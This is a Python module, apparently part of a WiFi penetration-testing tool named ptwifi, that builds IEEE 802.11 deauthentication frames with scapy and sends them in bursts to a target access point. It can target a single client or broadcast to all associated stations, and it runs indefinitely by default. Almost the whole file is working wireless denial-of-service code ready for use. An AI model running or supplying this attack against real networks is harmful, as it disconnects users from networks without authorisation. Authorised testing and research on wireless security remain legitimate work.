"""
modules/deauth_attack.py
Author: Martin Živný

Description
-----------
This module implements a WiFi deauthentication test in the ptwifi tool.

It constructs IEEE 802.11 deauthentication frames and transmits them toward
a specified Access Point and/or client station. The frames can be sent either
to a specific client MAC address or broadcast to all stations associated
with the target Access Point.

Responsibilities
----------------
- Construct IEEE 802.11 deauthentication frames
- Transmit deauthentication frames to a specified target
- Support broadcast or targeted deauthentication
- Control transmission rate and burst size
- Allow continuous or limited packet transmission
"""

from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap
from scapy.sendrecv import sendp
from helpers.helper_functions import *
import time

def run(interface : str, bssid : str, mac : str, time_period: float, number : int, burst_number : int):
    # Deauthentication attack procedure:
    # 1. Prepare a Dot11 deauthentication frame targeting the specified BSSID.
    # 2. Use the provided station MAC address or broadcast if none is specified.
    # 3. Construct the final frame using RadioTap + Dot11 + Dot11Deauth layers.
    # 4. Send the frame in configurable bursts.
    # 5. Wait the defined time interval between bursts.
    # 6. Continue either indefinitely or for a defined number of iterations.
    # 7. Stop execution when finished or when interrupted by the user.

    if time_period is None:
        time_period = 500

    if number is None:
        number = -1

    if mac is None:
        mac = "FF:FF:FF:FF:FF:FF"
    if burst_number is None:
        burst_number = 1
    dot11 = Dot11(
        addr1=mac,
        addr2=bssid,
        addr3=bssid,
        type=0,
        subtype=12
    )
    deauth_frame = Dot11Deauth(reason=7)

    packet = RadioTap() / dot11 / deauth_frame
    print(f"Sending deauthentication packets in bursts of {burst_number} packets at interval of {time_period} milliseconds.")
    if number == -1:
        print("Packets are sent indefinitely.")
        try:
            while True:
                sendp(packet, iface=interface, verbose=False, count=burst_number)
                time.sleep(time_period / 1000)
        except KeyboardInterrupt:
            print("Ending...")

    else:
        print(f"Packets will be sent {number} times.")
        try:
            for x in range(0, number):
                sendp(packet, iface=interface, verbose=False, count=burst_number)
                time.sleep(time_period / 1000)
            print("Ending...")
        except KeyboardInterrupt:
            print("Ending...")